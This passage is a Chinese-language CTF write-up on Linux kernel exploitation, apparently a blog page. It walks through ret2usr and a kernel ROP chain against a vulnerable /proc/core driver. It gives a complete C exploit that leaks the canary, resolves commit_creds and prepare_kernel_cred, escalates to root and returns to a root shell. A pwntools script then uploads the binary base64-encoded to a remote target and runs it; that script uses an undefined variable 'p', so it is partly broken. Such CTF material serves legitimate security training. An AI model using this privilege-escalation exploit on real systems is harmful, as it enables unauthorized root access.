+<pre tabindex="0"><code>pop rdi; ret
+prepare_kernel_cred(0)
+pop rdx; ret
+pop rcx; ret
+mov rdi, rax; call rdx;
+commit_creds
+swapgs; popfq; ret
+iretq; ret;
+</code></pre><p>具体的地址可以用 ropper 寻找：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ropper --file ./vmlinux --search <span class="s2">&#34;pop|ret&#34;</span> --nocolor &gt; gadgets
+</span></span></code></pre></div><h3 id="exp">exp<a hidden class="anchor" aria-hidden="true" href="#exp">#</a></h3>
+<blockquote>
+<p>ret2usr</p>
+</blockquote>
+<p>定义：将内核控制流劫持到用户地址空间。</p>
+<p>需要调用<code>commit_creds(prepare_kernel_cred(0))</code>，所以首先通过</p>
+<pre tabindex="0"><code>cat /proc/kallsyms | grep prepare_kernel_cred
+cat /proc/kallsyms | grep commit_creds
+</code></pre><p>确定两个函数的地址</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define KERNCALL __attribute__((regparm(3)))
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">void</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">prepare_kernel_cred</span><span class="p">)(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="n">KERNCALL</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="mh">0xffffffff810c91d0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">commit_creds</span><span class="p">)(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="n">KERNCALL</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="mh">0xffffffff810c8d40</span><span class="p">;</span>
+</span></span></code></pre></div><p>由于从内核返回的时候需要<code>CS</code>，<code>RFALGS</code>、<code>RSP</code>、<code>SS</code>等寄存器的值，所以在程序开头的时候需要我们手动保存一下。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">size_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">save_status</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">asm</span> <span class="k">volatile</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov user_cs, cs;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov user_ss, ss;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov user_sp, rsp;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;pushf;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;pop user_rflags;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\033</span><span class="s">[34m</span><span class="se">\033</span><span class="s">[1m[*] Status has been saved.</span><span class="se">\033</span><span class="s">[0m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>在没有开启 smep 保护的时候，可以直接执行用户内存中的代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">get</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">commit_creds</span><span class="p">(</span><span class="nf">prepare_kernel_cred</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="k">asm</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;swapgs</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;pushq user_ss</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;pushq user_sp</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;pushq user_rflags</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;pushq user_cs</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;push $shell</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;iretq</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;kernelpwn.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span> <span class="n">commit_creds</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//内核基地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">size_t</span> <span class="n">raw_vmlinux_base</span> <span class="o">=</span> <span class="mh">0xffffffff9361cc53</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span> <span class="n">vmlinux_base</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//解析/tmp/kallsyms来获取真实内核地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">size_t</span> <span class="nf">find_symbols</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span><span class="o">*</span> <span class="n">kallsyms_fd</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;/tmp/kallsyms&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">kallsyms_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*]open kallsyms error!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x30</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="nf">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="n">kallsyms_fd</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">commit_creds</span> <span class="o">&amp;</span> <span class="n">prepare_kernel_cred</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//根据计算出来的偏移计算内核地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span><span class="p">(</span><span class="nf">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;commit_creds&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">commit_creds</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="cm">/* puts(buf); */</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">char</span> <span class="n">hex</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">strncpy</span><span class="p">(</span><span class="n">hex</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">sscanf</span><span class="p">(</span><span class="n">hex</span><span class="p">,</span> <span class="s">&#34;%llx&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">commit_creds</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;commit_creds addr: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">commit_creds</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">vmlinux_base</span> <span class="o">=</span> <span class="n">commit_creds</span> <span class="o">-</span> <span class="mh">0x7fc8d</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;vmlinux_base addr: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">vmlinux_base</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nf">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;prepare_kernel_cred&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">prepare_kernel_cred</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">char</span> <span class="n">hex</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">strncpy</span><span class="p">(</span><span class="n">hex</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">sscanf</span><span class="p">(</span><span class="n">hex</span><span class="p">,</span> <span class="s">&#34;%llx&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">prepare_kernel_cred</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;prepare_kernel_cred addr: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">prepare_kernel_cred</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">prepare_kernel_cred</span> <span class="o">&amp;</span> <span class="n">commit_creds</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*]Error!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">set_off</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">idx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*]set off9 to %ld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6677889C</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">core_read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*]read to buf.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6677889B</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">core_copy_func</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*]copy from user with size: %ld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6677889A</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">save_status</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/proc/core&#34;</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*]open /proc/core error!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">find_symbols</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">ssize_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">vmlinux_base</span> <span class="o">-</span> <span class="n">raw_vmlinux_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">set_off</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x40</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">core_read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">canary</span> <span class="o">=</span> <span class="p">((</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]canary: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">canary</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">rop</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//0xffffffff9361cc53+0xb2f
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff81000b2f</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span> <span class="c1">// pop rdi; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">prepare_kernel_cred</span><span class="p">;</span>         <span class="c1">// prepare_kernel_cred(0)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff810a0f49</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span> <span class="c1">// pop rdx; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff81021e53</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span> <span class="c1">// pop rcx; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff8101aa6a</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span> <span class="c1">// mov rdi, rax; call rdx; 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff81a012da</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span> <span class="c1">// swapgs; popfq; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff81050ac2</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span> <span class="c1">// iretq; ret; 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">get_root_shell</span><span class="p">;</span> <span class="c1">// rip
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">rop</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">core_copy_func</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0xffffffffffff0000</span> <span class="o">|</span> <span class="p">(</span><span class="mh">0x100</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>编译执行：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gcc ./exp.c -static -masm<span class="o">=</span>intel -g -o exp    
+</span></span><span class="line"><span class="cl">cp exp core/exp
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> core
+</span></span><span class="line"><span class="cl">./gen_cpio.sh core.cpio
+</span></span><span class="line"><span class="cl">mv core.cpio ..
+</span></span><span class="line"><span class="cl">start.sh
+</span></span></code></pre></div><p>运行内核后执行 exp，之后通过<code>whoami</code>查看当前用户发现已经提权到 root 用户了。</p>
+<p>然后就可以 cat flag 了。</p>
+<img src="./assets/image-20251117123740678.png" alt="image-20251117123740678" style="zoom:50%;" />
+<h3 id="部署内核">部署内核<a hidden class="anchor" aria-hidden="true" href="#部署内核">#</a></h3>
+<h3 id="远程脚本">远程脚本<a hidden class="anchor" aria-hidden="true" href="#远程脚本">#</a></h3>
+<p>将二进制文件通过 base64 编码发送到远程机器上，然后执行提权。这样发送的速度是比较慢的，所以我们需要尽可能的缩小 exp 文件使其加快速度。</p>
+<p>一般可以通过 musl 工具链编译来缩小 exp 的文件大小以方便传输。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1">#安装 musl 工具链</span>
+</span></span><span class="line"><span class="cl">sudo apt install musl-tools
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#使用 musl-gcc 编译 exp</span>
+</span></span><span class="line"><span class="cl">musl-gcc -static -Os -o exp exp.c
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#去除符号进一步压缩</span>
+</span></span><span class="line"><span class="cl">strip exp
+</span></span></code></pre></div><p>远程脚本模板：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="mi">11451</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 加载本地 exp 并编码</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./exp&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">encoded</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">chunk_size</span> <span class="o">=</span> <span class="mi">512</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">encoded</span><span class="p">),</span> <span class="n">chunk_size</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">chunk</span> <span class="o">=</span> <span class="n">encoded</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">chunk_size</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#34;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;/ $&#34;</span><span class="p">,</span> <span class="sa">f</span><span class="s1">&#39;echo -n &#34;</span><span class="si">{</span><span class="n">chunk</span><span class="si">}</span><span class="s1">&#34; &gt;&gt; /tmp/b64_exp&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 解码 &amp; 执行</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;/ $&#34;</span><span class="p">,</span> <span class="s2">&#34;base64 -d /tmp/b64_exp &gt; /tmp/exploit&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;/ $&#34;</span><span class="p">,</span> <span class="s2">&#34;chmod +x /tmp/exploit&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;/ $&#34;</span><span class="p">,</span> <span class="s2">&#34;/tmp/exploit&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
